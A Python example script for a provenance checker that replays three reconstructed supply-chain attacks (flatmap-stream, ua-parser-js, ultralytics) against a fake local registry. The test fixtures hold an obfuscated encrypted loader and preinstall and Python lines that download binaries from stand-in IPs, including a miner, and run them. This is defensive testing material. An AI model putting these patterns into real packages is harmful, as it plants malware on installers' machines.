"""Replay three real supply-chain attacks against a local fake npm / PyPI / GitHub and run provenance on
them. The packages are reconstructions with inert stand-in payloads (no real malware), shaped like
the public write-ups of each incident:

  flatmap-stream 0.1.1 (event-stream, 2018)  encrypted payload appended to the minified build only
  ua-parser-js 0.7.29 (2021)                 hijacked release with a preinstall script that fetched a miner
  ultralytics 8.3.41 (2024)                  poisoned release workflow: the PyPI files run a miner

    python examples/replay.py
"""

import json
import os
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

from fakeworld import World  # noqa: E402

SHA = "3f2c8e1a9b7d6c5e4f3a2b1c0d9e8f7a6b5c4d3e"

w = World()
# event-stream / flatmap-stream: the repository is clean, the npm tarball's index.min.js is not
flat = "module.exports = function flatMap(stream, fn) {\n  return stream.pipe(fn);\n};\n"
payload = ("!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,\"hex\").toString()}"
           "var n=r(e(\"2e2f746573742f64617461\")),o=t.env.npm_package_description;"
           "var u=r(\"crypto\").createDecipher(\"aes256\",o),a=u.update(n[0],\"hex\",\"utf8\");"
           "var f=new module.constructor;f.paths=module.paths,f._compile(a,\"\")}catch(r){}}();")
w.repo("hugeglass/flatmap-stream", SHA, {"index.js": flat, "package.json": json.dumps({"name": "flatmap-stream", "version": "0.1.1"})})
w.npm("flatmap-stream", "0.1.1", {"index.js": flat, "index.min.js": "module.exports=function(s,f){return s.pipe(f)};" + payload,
                                  "package.json": json.dumps({"name": "flatmap-stream", "version": "0.1.1"})},
      repo="hugeglass/flatmap-stream", git_head=SHA)

# ua-parser-js: a preinstall script and its dropper appear only in the published package
ua = "var UAParser = function (ua) { this.ua = ua; };\nmodule.exports = UAParser;\n"
manifest = {"name": "ua-parser-js", "version": "0.7.29", "main": "src/ua-parser.js"}
w.repo("faisalman/ua-parser-js", "0.7.29", {"src/ua-parser.js": ua, "package.json": json.dumps(manifest)})
w.npm("ua-parser-js", "0.7.29", {"src/ua-parser.js": ua,
                                 "package.json": json.dumps(dict(manifest, scripts={"preinstall": "start /B node preinstall.js & node preinstall.js"})),
                                 "preinstall.js": "const { exec } = require('child_process');\n"
                                                  "exec('curl http://198.51.100.7/download/jsextension -o jsextension && ./jsextension');\n"},
      repo="faisalman/ua-parser-js")

# ultralytics: the repository's downloads.py is clean, the PyPI release's is not
clean = "import requests\n\n\ndef safe_download(url, file):\n    return requests.get(url).content\n"
evil = clean + ("\nimport subprocess, os\n"
                "subprocess.Popen(['curl', '-sL', 'http://203.0.113.50/xmrig', '-o', '/tmp/ultralytics_runner'])\n"
                "os.system('chmod +x /tmp/ultralytics_runner && /tmp/ultralytics_runner')\n")
w.repo("ultralytics/ultralytics", "v8.3.41", {"ultralytics/utils/downloads.py": clean, "ultralytics/__init__.py": "__version__ = '8.3.41'\n"})
w.pypi("ultralytics", "8.3.41", {"ultralytics/utils/downloads.py": evil, "ultralytics/__init__.py": "__version__ = '8.3.41'\n",
                                 "PKG-INFO": "Metadata-Version: 2.1\nName: ultralytics\n"}, repo="ultralytics/ultralytics")

env = {**os.environ, "PROVENANCE_NPM": w.url, "PROVENANCE_PYPI": w.url, "PROVENANCE_CODELOAD": w.url,
       "PROVENANCE_GITHUB_API": w.url, "PYTHONIOENCODING": "utf-8"}
args = [a for a in sys.argv[1:]] or ["--no-color"]
r = subprocess.run([sys.executable, "-m", "provenance", "npm:flatmap-stream@0.1.1", "npm:ua-parser-js@0.7.29",
                    "pypi:ultralytics==8.3.41", *args], cwd=ROOT, env=env)
w.close()
sys.exit(r.returncode)
